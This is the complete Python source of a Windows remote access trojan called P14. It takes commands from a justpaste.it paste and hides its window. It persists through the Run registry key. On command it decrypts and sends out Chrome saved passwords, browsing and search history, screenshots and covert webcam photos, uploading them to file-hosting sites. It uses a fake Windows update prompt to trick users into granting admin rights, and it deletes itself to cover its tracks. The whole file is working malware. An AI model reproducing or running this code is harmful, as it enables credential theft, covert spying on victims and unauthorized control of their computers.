
import time, sys, os, random, socket, shutil, requests, smtplib, json, pathlib, platform, pyautogui, ctypes, cv2, base64, sqlite3, re, win32console, win32gui, win32crypt, subprocess, psutil
import browserhistory                  as     bh
from   winreg                          import *
from   email.message                   import EmailMessage
from   Crypto.Cipher                   import AES
from   selenium                        import webdriver
from   selenium.common.exceptions      import NoSuchElementException
from   selenium.webdriver.common.keys  import Keys
from   selenium.webdriver.common.by    import By
from   bs4                             import BeautifulSoup
from   nordvpn_connect                 import initialize_vpn, rotate_VPN, close_vpn_connection
from   selenium.webdriver.common.action_chains import ActionChains
from   selenium.common.exceptions              import WebDriverException
from   webdriver_manager.chrome                import ChromeDriverManager

url_real = 'https://justpaste.it/p14'
url_edit = 'https://justpaste.it/edit/40147871/bzmq3r2klc6m1txw'
from selenium.webdriver.chrome.options import Options
chrome_options = Options()
chrome_options.add_argument("--headless")

# Desktop Vars
desktop      = os.path.join(os.path.join(os.environ['USERPROFILE'], 'Desktop'))
ODdesktop    = desktop.replace("Desktop","OneDrive\Desktop")


start_path = str(pathlib.Path().parent.absolute())

def command(cmd):
    blackloop = True
    while blackloop == True:
        try:
            driver = webdriver.Chrome(ChromeDriverManager().install(),chrome_options=chrome_options)
            time.sleep(1)
            driver.get(url_edit)
            time.sleep(2)
            black = driver.find_element_by_css_selector('#editArticleWidget').text
            if "Something went wrong: Too many published articles. Please wait to add next article." in str(black):
                print("P14 BLOCKED. WAITING 15 MINUTES.")
                driver.quit()
                time.sleep(900)
            else:
                blackloop = False
        except Exception as e:
            print(str(e))
            if "HTTPConnectionPool" not in str(e):
                blackloop = False
    element = driver.find_element(By.XPATH, '//*[@id="editArticleWidget"]/div/div[1]/div/div[1]/div[1]/div[1]/input')
    element.send_keys(Keys.CONTROL, 'a')
    element.send_keys('[READY]')
    element = driver.find_element(By.XPATH, '//*[@id="tinyMCEEditor_ifr"]')
    element.send_keys(Keys.CONTROL, 'a')
    try:
         element.send_keys(cmd)
    except Exception as e:
         element.send_keys(str(e))
    element = driver.find_element(By.XPATH, '//*[@id="editArticleWidget"]/div/div[1]/div/div[2]/button')
    element.click()
    time.sleep(1)
    driver.quit()

def cmdcheck():
    global response
    checkloop = True
    while checkloop == True:
        try:
             page     = requests.get(url_real, headers = {'User-agent': 'your bot 0.1'})
             soup     = BeautifulSoup(page.text, "html.parser")
             div      = soup.find("div", {"class": "text-center"})
             content  = str(div.text)
             div2     = soup.find("div", {"id": "articleContent"}) 
             content2 = str(div2.text)
             print(content)
             print(content2)
             if "[CMD]" in content.upper():
                 response = content2.upper()
                 checkloop = False
                 break
        except AttributeError:
            print("P14 BLOCKED. WAITING 15 MINUTES.")
            time.sleep(900)
        except Exception as e:
             print("ERROR: "+str(e))
             time.sleep(1)
             print("Trying again...")
             time.sleep(0.1)
        print("5 Minutes...") #avoiding ban
        time.sleep(60)
        print("4 Minutes...")
        time.sleep(60)
        print("3 Minutes...")
        time.sleep(60)
        print("2 Minutes...")
        time.sleep(60)
        print("1 Minute...")
        time.sleep(60)

def standby():
    print('No standby.')

# DIR Command
def DIR():
     global final_dir
     current_dir = []
     for i in os.listdir(os.getcwd()):
          current_dir.append(i)
     final_dir = """"""
     for i in current_dir:
          final_dir += str(i) + "___"

# PATH Command
def PATH():
     global current_path
     current_path = str(pathlib.Path().parent.absolute())

# hide P14
def hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

# add P14 to startup
def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'P14', 0, REG_SZ,new_file_path)

def get_master_key():                                                                                              ##CREDS##
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:       #
         local_state = f.read()                                                                                            #
         local_state = json.loads(local_state)                                                                             #
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])                                               #
     master_key = master_key[5:]  # removing DPAPI                                                                         #
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]                                        #
     return master_key                                                                                                     #
                                                                                                                           #
def decrypt_payload(cipher, payload):                                                                                      #
     return cipher.decrypt(payload)                                                                                        #
                                                                                                                           #
def generate_cipher(aes_key, iv):                                                                                          #
     return AES.new(aes_key, AES.MODE_GCM, iv)                                                                             #
                                                                                                                           #
def decrypt_password(buff, master_key):                                                                                    #
     try:                                                                                                                  #
         iv = buff[3:15]                                                                                                   #
         payload = buff[15:]                                                                                               #
         cipher = generate_cipher(master_key, iv)                                                                          #
         decrypted_pass = decrypt_payload(cipher, payload)                                                                 #
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes                                             #
         return decrypted_pass                                                                                             #
     except Exception as e:                                                                                                #
         print("Probably saved password from Chrome version older than v80\n")                                             #
         print(str(e))                                                                                                     #
         return "Chrome < 80"                                                                                      ##CREDS##


########################## P14 STARTS ##########################
hide()
# dig in
if   str(os.getcwd()) == desktop or str(os.getcwd()) == ODdesktop:
     print("ON DESKTOP")
     self           = str(os.getcwd())
     current_path   = self
     current_pathE  = current_path + "\P14.exe"
     current_pathP  = current_path + "\P14.py"
     os.chdir(os.path.dirname(os.getcwd()))
     move_path      = str(os.getcwd())
     if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
         print("P14.exe found")
         shutil.copy(current_pathE, move_path+'/P14.exe')
         os.startfile(move_path+"/P14.exe")
         self = self + "\P14.exe"
         os.remove(self)
     else:
         print("P14.py found")
         shutil.copy(current_pathP, move_path+'/P14.py')
         os.startfile(move_path+"/P14.py")
         
         os.remove(sys.argv[0])
else:
     addStartup()
     print("INFILTRATION COMPLETE.")
     pathE  = desktop+"\P14.exe"
     pathE2 = ODdesktop+"\P14.exe"
     pathP  = desktop+"\P14.py"
     pathP2 = ODdesktop+"\P14.py"
     try:
         os.remove(pathE)
         print("exe removed")
     except:
         try:
             os.remove(pathE2)
             print("exe removed")
         except:
             print("No exe found")
     try:
         os.remove(pathP)
         print("py removed")
     except:
         try:
             os.remove(pathP2)
             print("py removed")
         except:
             print("No py found")
     #find INSp14.txt, read if found and delete target file + txt
     import glob
     for file in glob.glob("*.txt"):
         if file == "INSp14.txt":
             print("INSfile found!")
             with open(file) as F:
                 ins = F.readline()
             try:
                 os.remove(str(ins))
             except Exception as e:
                 print("Failed to delete instructed file '"+ins+"'. Error: "+str(e))
             try:
                 os.remove(file)
             except Exception as e:
                 print("Failed to delete INSfile '"+file+"'. Error: "+str(e))
         else:
             print("Not INSfile.")
             
#P14
admin = ""
if   ctypes.windll.shell32.IsUserAnAdmin() == 1:
     admin = "with admin rights"
elif ctypes.windll.shell32.IsUserAnAdmin() == 0:
     admin = "without admin rights"
command("P14 is online "+admin+".")
while True:
   standby()
   commandloop = True
   while commandloop == True:
        try:
            response
        except NameError:
            response = "NONE"
        try:
            cmdcheck()
        except Exception as e:
            print("ERROR ("+str(e)+")")
            print("Something went wrong with cmdcheck().")
        if   "HELP"    in response:
            command("HELP COMMAND RECEIVED. \nHELP;PATH;DIR;INTEL;CREDS;HISTORY;DIG;SHOT;SNAP;GET;EXIT;WIPE")
        elif "PATH"    in response:
            PATH()
            command("PATH COMMAND RECEIVED. \nCurrent Path: "+str(current_path.encode("UTF-8")))
        elif "DIR"     in response:
            DIR()
            command("DIR COMMAND RECEIVED.  \nCurrent Files: "+str(final_dir.encode("UTF-8")))
        elif "INTEL"   in response:                                                                      #put path and dir in intel? maybe help too and call it REPORT or REP?
            INTEL = []
            if   ctypes.windll.shell32.IsUserAnAdmin() == 1:
                 admin = "YES."
            elif ctypes.windll.shell32.IsUserAnAdmin() == 0:
                 admin = "NO."
            INTEL.append("OS   : "+str(platform.platform())+ " -+-+- ")
            INTEL.append("NODE : "+str(platform.node())+ " -+-+- ")
            INTEL.append("CPU  : "+str(platform.processor())+ " -+-+- ")
            INTEL.append("USER : "+str(os.getlogin())+ " -+-+- ")
            INTEL.append("ADMIN: "+admin)
            INTEL = str(INTEL)
            INTEL = INTEL.replace("[","")
            INTEL = INTEL.replace("]","")
            command("INTEL COMMAND RECEIVED."+str(INTEL.encode("UTF-8")))
        elif "HISTORY" in response:
            try:
                chrome_open = False
                for proc in psutil.process_iter():
                    if proc.name() == "chrome.exe":
                        proc.kill()
                        chrome_open = True
                if chrome_open == True:
                    print("Chrome closed")
                else:
                    print("Chrome not open")
                print("Chrome closed")
            except Exception as e:
                print("Chrome not open")
            REQUEST = ""
            history = bh.get_browserhistory()
            
            if "chrome" in history.keys():
                REQUEST += "CHROME\n"
                REQUEST += "-----------------------------------------------------------------\n \n"
                for i in history["chrome"]:
                    REQUEST += str(i) + "\n"
            if "firefox" in history.keys():
                REQUEST += "FIREFOX\n"
                REQUEST += "-----------------------------------------------------------------\n \n"
                for i in history["firefox"]:
                    REQUEST += str(i) + "\n"
            if "safari" in history.keys():
                REQUEST += "SAFARI\n"
                REQUEST += "-----------------------------------------------------------------\n \n"
                for i in history["safari"]:
                    REQUEST += str(i) + "\n"
            search = ""
            for line in REQUEST.splitlines():
                if "search?q=" in line or "//s?k=" in line or "?search_query=" in line:
                    search  += str(line) + "\n"
            command("--------------------------SEARCH-HISTORY-------------------------\n \n"+search)
        elif "CREDS" in response:
             try:
                 REQUEST = ""
                 master_key = get_master_key()
                 login_db   = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                 shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                 conn       = sqlite3.connect("Loginvault.db")
                 cursor     = conn.cursor()
                 try:
                     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                     for r in cursor.fetchall():
                         url = r[0]
                         username = r[1]
                         encrypted_password = r[2]
                         decrypted_password = decrypt_password(encrypted_password, master_key)
                         if len(username) > 0:
                             REQUEST += "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                 except Exception as e:
                     pass
                 cursor.close()
                 conn.close()
                 try:
                     os.remove("Loginvault.db")
                 except Exception as e:
                     pass
                 command(str(REQUEST))
             except Exception as E:
                 command("CREDS Command failed. Error: "+str(E)+" \n \nAttention. AV might have alerted the Subject. Check with SNAP and SHOT commands.")
        elif "DIG" in response:
             def handleRemoveReadonly(func, path, exc):
                 excvalue = exc[1]
                 if func in (os.rmdir, os.remove) and excvalue.errno == errno.EACCES:
                     os.chmod(path, stat.S_IRWXU| stat.S_IRWXG| stat.S_IRWXO) # 0777
                     func(path)
                 else:
                     raise
             try:
                 original   = str(os.getcwd())
                 originalE  = original + "\P14.exe"
                 originalP  = original + "\P14.py"
                 os.chdir(os.path.dirname(os.getcwd()))
                 new        = str(os.getcwd())
                 newE       = new + "\P14.exe"
                 newP       = new + "\P14.py"
                 if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
                     print("P14.exe found")
                     shutil.copy(originalE, newE) #copying  original P14 to one level deeper (digging)
                     os.startfile(newE)           #starting new P14
                     INSfile = open(new+"\INSp14.txt","w+")
                     INSfile.write(originalE)
                     INSfile.close()
                     os._exit(0)
                 else:
                     print("P14.py found")
                     shutil.copy(originalP, newP)  #copying  original P14 to one level deeper (digging)
                     os.startfile(newP)            #starting new P14
                     INSfile = open(new+"\INSp14.txt","w+")
                     INSfile.write(originalP)
                     INSfile.close()
                     os._exit(0)                                # there is some error in dig... doesnt delete itself - even with admin rights. aborts program
                 result = "\nDigged\nFROM: "+original+"\nINTO: "+new+"\nSuccessfully."
                 command("DIG COMMAND RECEIVED. \n"+result)
             except PermissionError:
                 try:
                     shutil.rmtree(original, ignore_errors=False, onerror=handleRemoveReadonly)
                 except Exception as e:
                     result = "\nFailed to dig\nFROM: "+original+"\nINTO: "+new+"\Error: "+str(e)
                     if os.path.isfile(newE) == True:
                         os.remove(newE)
                     if os.path.isfile(newP) == True:
                         os.remove(newP)
                     command("DIG COMMAND RECEIVED. \n"+result)
        elif "GET"  in response:
             locked = True
             lock   = 0
             while locked == True:
                 time.sleep(1)
                 process_name = "LogonUI.exe"
                 callall      = "TASKLIST"
                 outputall    = subprocess.check_output(callall)
                 if process_name in str(outputall):
                     lock += 1
                     if lock == 1:
                         command("GET COMMAND RECEIVED. \nMachine is locked. Prompting UAC on unlock.")
                 else:
                     locked = False #adjust here later, check recent user activity
             ctypes.windll.user32.MessageBoxW(0, u"Important Windows Security Update Needed! Admin rights required!", u"Critical Windows Update!", 0)  #prompt notification to SocEn target and legitimize PrivEsc
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)                                           #PrivEsc
             time.sleep(5)                                                                                          
             procount = 0                           # check if two P14 services are now running. If yes, privilege escalation probably worked. Close this one.
             for proc in psutil.process_iter():
                 try:
                     processName = proc.name()
                     processID = proc.pid
                     if "P14" in processName:
                         procount += 1
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     pass
             if   procount <= 2:
                 command("GET COMMAND FINISHED. \nP14 is still not admin.")
             elif procount > 2:
                 command("GET COMMAND FINISHED. \nP14 probably running as admin now. Confirm with INTEL command.")
                 
                 os._exit(0)
        elif "SHOT" in response:
             link = ""
             shot = pyautogui.screenshot()
             here = str(os.getcwd())+"\shot.jpg"
             shot.save(here)
             url  = "https://filebin.net"
             try:
                  with open(here,'rb') as f:
                       files  = {"upload_file":f}
                       r      = requests.post(url, files=files)
                  for line in str(r.text).split("\n"):
                      if "href" in line:
                          link += str(line)
                          break
                  if link == "":
                      print("Trying gofile")
                      try:
                          with open(here,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url2   = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url2, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link   = str(LINK)
                      except Exception as t:
                          print("ERROR TRYING GOFILE: "+str(t))
                  else:
                      print("Filebin worked.")
                  try:
                      os.remove(here)
                      command("SHOT COMMAND EXECUTED. ("+str(link)+") Tracks covered.")
                  except Exception:
                      command("SHOT COMMAND EXECUTED. ("+str(link)+") Tracks NOT covered.")
             except Exception as error:
                  try:
                      os.remove(here)
                      command("SHOT COMMAND EXECUTED. ERROR: "+str(error)+" Tracks covered.")
                  except Exception:
                      command("SHOT COMMAND EXECUTED. ERROR: "+str(error)+" Tracks NOT covered.")
        elif "SNAP" in response:
             link11 = ""
             link12 = ""
             link13 = ""
             link21 = ""
             link22 = ""
             link23 = ""
             link31 = ""
             link32 = ""
             link33 = ""
             mail   = "Good morning sir, \n \n P14 executed the SNAP command as ordered. \n\n REPORT: \n"
             url    = "https://filebin.net"
             here11,here12,here13,here21,here22,here23,here31,here32,here33 = str(os.getcwd())+"\snap11.jpg",str(os.getcwd())+"\snap12.jpg",str(os.getcwd())+"\snap13.jpg",str(os.getcwd())+"\snap21.jpg",str(os.getcwd())+"\snap22.jpg",str(os.getcwd())+"\snap23.jpg",str(os.getcwd())+"\snap31.jpg",str(os.getcwd())+"\snap32.jpg",str(os.getcwd())+"\snap33.jpg"
             try:# webcam1
                  webcam1 = cv2.VideoCapture(0)
                  check, frame = webcam1.read()
                  print("Readying Webcam1|Snap11...")
                  time.sleep(5)
                  check, frame = webcam1.read()
                  cv2.imwrite(filename="snap11.jpg",img=frame)
                  print("Snap11 done.")
                  #
                  webcam1 = cv2.VideoCapture(0)
                  check, frame = webcam1.read()
                  print("Readying Webcam1|Snap12...")
                  time.sleep(5)
                  check, frame = webcam1.read()
                  cv2.imwrite(filename="snap12.jpg",img=frame)
                  print("Snap12 done.")
                  #
                  webcam1 = cv2.VideoCapture(0)
                  check, frame = webcam1.read()
                  print("Readying Webcam1|Snap13...")
                  time.sleep(5)
                  check, frame = webcam1.read()
                  cv2.imwrite(filename="snap13.jpg",img=frame)
                  print("Snap13 done.")
                  #
                  try:
                        with open(here11,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link11 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link11 += str(line)
                                        break
                        with open(here12,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link12 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link12 += str(line)
                                        break
                        with open(here13,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link13 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link13 += str(line)
                                        break
                  except Exception as error:
                       print(str(error))
                  linksall = link11 + link12 + link13
                  if linksall == "":
                      print("Trying gofile")
                      try:
                          with open(here11,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link11 = str(LINK)
                              print(link11)
                          with open(here12,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link12 = str(LINK)
                              print(link12)
                          with open(here13,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link13 = str(LINK)
                              print(link13)
                      except Exception as e:
                          print("ERROR("+str(e)+")")
                  mail += "webcam1 found.\n"
             except Exception as e:# webcam1 end
                  print("Webcam1 not found.")
                  mail += "webcam1 not found. \n"
             try:# webcam2
                  webcam2 = cv2.VideoCapture(1)
                  check, frame = webcam2.read()
                  print("Readying Webcam2|Snap21...")
                  time.sleep(5)
                  check, frame = webcam2.read()
                  cv2.imwrite(filename="snap21.jpg",img=frame)
                  print("Snap21 done.")
                  #
                  webcam2 = cv2.VideoCapture(1)
                  check, frame = webcam2.read()
                  print("Readying Webcam2|Snap22...")
                  time.sleep(5)
                  check, frame = webcam2.read()
                  cv2.imwrite(filename="snap22.jpg",img=frame)
                  print("Snap22 done.")
                  #
                  webcam2 = cv2.VideoCapture(1)
                  check, frame = webcam2.read()
                  print("Readying Webcam2|Snap23...")
                  time.sleep(5)
                  check, frame = webcam2.read()
                  cv2.imwrite(filename="snap23.jpg",img=frame)
                  print("Snap23 done.")
                  #
                  try:
                        with open(here21,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link21 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link21 += str(line)
                                        break
                        with open(here22,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link22 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link22 += str(line)
                                        break
                        with open(here23,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link23 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link23 += str(line)
                                        break
                  except Exception as error:
                       print(str(error))
                  linksall = link21 + link22 + link23
                  if linksall == "":
                      print("Trying gofile")
                      try:
                          with open(here21,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link21 = str(LINK)
                              print(link21)
                          with open(here22,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link22 = str(LINK)
                              print(link22)
                          with open(here23,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link23 = str(LINK)
                              print(link23)
                      except Exception as e:
                          print("ERROR("+str(e)+")")
                  mail += "webcam2 found.\n"
             except Exception as e:# webcam2 end
                  print("Webcam2 not found.")
                  mail += "webcam2 not found. \n"
             try:# webcam3
                  webcam3 = cv2.VideoCapture(2)
                  check, frame = webcam3.read()
                  print("Readying Webcam3|Snap31...")
                  time.sleep(5)
                  check, frame = webcam3.read()
                  cv2.imwrite(filename="snap31.jpg",img=frame)
                  print("Snap31 done.")
                  #
                  webcam3 = cv2.VideoCapture(2)
                  check, frame = webcam3.read()
                  print("Readying Webcam3|Snap32...")
                  time.sleep(5)
                  check, frame = webcam3.read()
                  cv2.imwrite(filename="snap32.jpg",img=frame)
                  print("Snap32 done.")
                  #
                  webcam3 = cv2.VideoCapture(2)
                  check, frame = webcam3.read()
                  print("Readying Webcam3|Snap33...")
                  time.sleep(5)
                  check, frame = webcam3.read()
                  cv2.imwrite(filename="snap33.jpg",img=frame)
                  print("Snap33 done.")
                  #
                  try:
                        with open(here31,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link31 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link31 += str(line)
                                        break
                        with open(here32,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link32 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link32 += str(line)
                                        break
                        with open(here33,'rb') as f:
                            files  = {"upload_file":f}
                            r      = requests.post(url, files=files)
                            if "Response [405]" in str(r):
                                print("405: Method not allowed.")
                                link33 = ""
                            else:
                                print(str(r))
                                for line in str(r.text).split("\n"):
                                    if "href" in line:
                                        link33 += str(line)
                                        break
                  except Exception as error:
                       print(str(error))
                  linksall = link31 + link32 + link33
                  if linksall == "":
                      print("Trying gofile")
                      try:
                          with open(here31,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link31 = str(LINK)
                              print(link31)
                          with open(here32,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link32 = str(LINK)
                              print(link32)
                          with open(here33,'rb') as f:
                              r      = requests.get("https://api.gofile.io/getServer")
                              rdict  = r.json()
                              serve  = str(rdict['data']).replace("{'server': '","").replace("'}","")
                              url_02 = "https://"+serve+".gofile.io/uploadFile"
                              files  = {"upload_file":f}
                              r      = requests.post(url_02, files=files)
                              rdict  = r.json()
                              rdict  = rdict['data']
                              LINK   = rdict['directLink']
                              link33 = str(LINK)
                              print(link33)
                      except Exception as e:
                          print("ERROR("+str(e)+")")
                  mail += "webcam3 found.\n"
             except Exception as e:#webcam3 found
                  print("Webcam3 not found.")
                  mail += "webcam3 not found. \n"
             LINK = """"""
             if link11 == "":
                 LINK += "Snap11: NO LINK\n"
             else:
                 LINK += "Snap11: "+link11+"\n"
             if link12 == "":
                 LINK += "Snap12: NO LINK\n"
             else:
                 LINK += "Snap12: "+link12+"\n"
             if link13 == "":
                 LINK += "Snap13: NO LINK\n"
             else:
                 LINK += "Snap13: "+link13+"\n"
             if link21 == "":
                 LINK += "Snap21: NO LINK\n"
             else:
                 LINK += "Snap21: "+link21+"\n"
             if link22 == "":
                 LINK += "Snap22: NO LINK\n"
             else:
                 LINK += "Snap22: "+link22+"\n"
             if link23 == "":
                 LINK += "Snap23: NO LINK\n"
             else:
                 LINK += "Snap23: "+link23+"\n"
             if link31 == "":
                 LINK += "Snap31: NO LINK\n"
             else:
                 LINK += "Snap31: "+link31+"\n"
             if link32 == "":
                 LINK += "Snap32: NO LINK\n"
             else:
                 LINK += "Snap32: "+link32+"\n"
             if link33 == "":
                 LINK += "Snap33: NO LINK\n"
             else:
                 LINK += "Snap33: "+link33+"\n"
             mail = mail +"\n"+ LINK
             webcam1.release()
             webcam2.release()
             webcam3.release()
             try:   #wiping evidence
                 if os.path.exists(here11) == True:
                     time.sleep(1)
                     os.remove(here11)
                     print("Snap11 wiped.")
                 if os.path.exists(here12) == True:
                     time.sleep(1)
                     os.remove(here12)
                     print("Snap12 wiped.")
                 if os.path.exists(here13) == True:
                     time.sleep(1)
                     os.remove(here13)
                     print("Snap13 wiped.")
                 if os.path.exists(here21) == True:
                     time.sleep(1)
                     os.remove(here21)
                     print("Snap21 wiped.")
                 if os.path.exists(here22) == True:
                     time.sleep(1)
                     os.remove(here22)
                     print("Snap22 wiped.")
                 if os.path.exists(here23) == True:
                     time.sleep(1)
                     os.remove(here23)
                     print("Snap23 wiped.")
                 if os.path.exists(here31) == True:
                     time.sleep(1)
                     os.remove(here31)
                     print("Snap31 wiped.")
                 if os.path.exists(here32) == True:
                     time.sleep(1)
                     os.remove(here32)
                     print("Snap32 wiped.")
                 if os.path.exists(here33) == True:
                     time.sleep(1)
                     os.remove(here33)
                     print("Snap33 wiped.")
             except Exception as e:
                 print("ERROR ("+str(e)+")")
             command("SNAP COMMAND EXECUTED. ("+mail+")")
        elif "EXIT"  in response:
            command("EXIT COMMAND.")
            
            os._exit(0)
        elif "WIPE"  in response:
            command("WIPE COMMAND.")                        # when youre already at the point of renaming/disguising p14 and errors pop up because its still mentioned as p14.exe/.py at some points: THE ANSWER IS HERE
            try:
                if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
                    dname, fname = os.path.split(os.path.abspath(__file__))
                    fname = str(os.path.splitext(fname)[0])+".exe"
                    here = dname + "\\" + fname
                    bat = open(dname+"\del.bat","w+")
                    bat.write('SETCONSOLE /hide\ntimeout 1 \nDEL '+fname+'\nstart /b "" cmd /c del "%~f0"&exit /b')
                    bat.close()
                    time.sleep(3)
                    os.startfile("del.bat")
                    
                    os._exit(0)
                else:
                    print("I am python")
                    os.remove(sys.argv[0])
                    
                    os._exit(0)
            except Exception as e:
                command("WIPE COMMAND FAILED. ("+str(e)+")")
        elif "NONE" in response:
            print("No command found.")
        else:
            command("UNKNOWN COMMAND! ("+str(response.encode("UTF-8"))+")")
